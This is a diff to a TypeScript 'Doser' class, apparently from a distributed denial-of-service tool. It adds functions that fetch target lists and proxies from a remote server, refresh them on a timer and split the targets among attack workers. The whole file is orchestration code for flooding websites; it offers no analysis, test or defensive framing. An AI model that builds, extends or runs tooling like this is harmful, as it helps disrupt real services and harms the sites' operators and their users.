@@ -1,8 +1,8 @@
 import { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse, TargetDataAlternative } from './types'
+import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse, GetTargetsResponse, TargetDataAlternative } from './types'
 import { Runner } from './runner'
-import { getSites, getProxies } from './requests'
+import { getSites, getProxies, getTargets } from './requests'
 
 const CONFIGURATION_INVALIDATION_TIME = 300000
 
@@ -49,8 +49,14 @@ export class Doser {
       console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
       return this.initialize(numberOfWorkers, attemptNumber + 1)
     }
+    const configPairs = await this.getTargetsfrom()
+    if (!configPairs) {
+      console.debug(`Wasnt able to get targets configuration. Trying for ${attemptNumber} time`)
+      return this.initialize(numberOfWorkers, attemptNumber + 1)
+    }
     console.debug('Initialized doser', config)
-    this.makeTargets(config, targets)
+    //this.makeTargets(config, targets)
+    this.makeTargets2(configPairs,targets)
     this.updateConfiguration(config, targets)
     this.listenForConfigurationUpdates()
     return this.setWorkersCount(numberOfWorkers)
@@ -74,6 +80,13 @@ export class Doser {
     // this.hosts = response.data as Array<string>
   }
 
+  private makeTargets2(configuration: { target:TargetDataAlternative[] }, targets: TargetDataAlternative[]) {
+    let targetsLocal: TargetDataAlternative[] = []
+    for (let i = 0; i < configuration.target.length; i++) {
+      targets.push(configuration.target[i])
+      console.log(configuration.target[i])
+    }
+  }
 
   private makeTargets(configuration: { sites: SiteData[]; proxies: ProxyData[] }, targets: TargetDataAlternative[]) {
     let targetsLocal: TargetDataAlternative[] = []
@@ -113,7 +126,14 @@ export class Doser {
         console.debug('Wasnt able to get configuration updates')
         return this.listenForConfigurationUpdates(false)
       }
-      this.makeTargets(config, targets)
+      const configPairs = await this.getTargetsfrom()
+      if (!configPairs) {
+        console.debug(`Wasnt able to get targets updates.`)
+        return this.listenForConfigurationUpdates(false)
+      }
+      console.debug('Initialized doser', config)
+      //this.makeTargets(config, targets)
+      this.makeTargets2(configPairs,targets)
       this.updateConfiguration(config, targets)
       this.listenForConfigurationUpdates(true)
     }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
@@ -131,6 +151,21 @@ export class Doser {
         }
       } catch (e) {
         this.logError('Error while loading hosts', e)
+      }
+    }
+    return null
+  }
+  async getTargetsfrom(): Promise<GetTargetsResponse> {
+    while (this.working) { // escaping unavailable hosts
+      try {
+        const [targets] = await Promise.all([getTargets() ])
+
+        if (targets.status !== 200 ) continue
+        return {
+          target: targets.data
+        }
+      } catch (e) {
+        this.logError('Error while loading hosts targets', e)
       }
     }
     return null
@@ -186,15 +221,15 @@ export class Doser {
         let size = Math.floor(this.ddosConfiguration.targets.length / newCount)
         for (let i = 0; i < newCount; i++) {
           if (i < newCount - 1) {
-            const newWorker = this.createNewWorker(i*size,(i+1)*size)
+            const newWorker = this.createNewWorker(i * size, (i + 1) * size)
             this.workers.push(newWorker)
             if (this.working) {
               newWorker.start().catch(error => {
                 console.debug('Wasnt able to start new runner:', error)
               })
             }
-          }else{
-            const newWorker = this.createNewWorker(i*size,this.ddosConfiguration.targets.length)
+          } else {
+            const newWorker = this.createNewWorker(i * size, this.ddosConfiguration.targets.length)
             this.workers.push(newWorker)
             if (this.working) {
               newWorker.start().catch(error => {
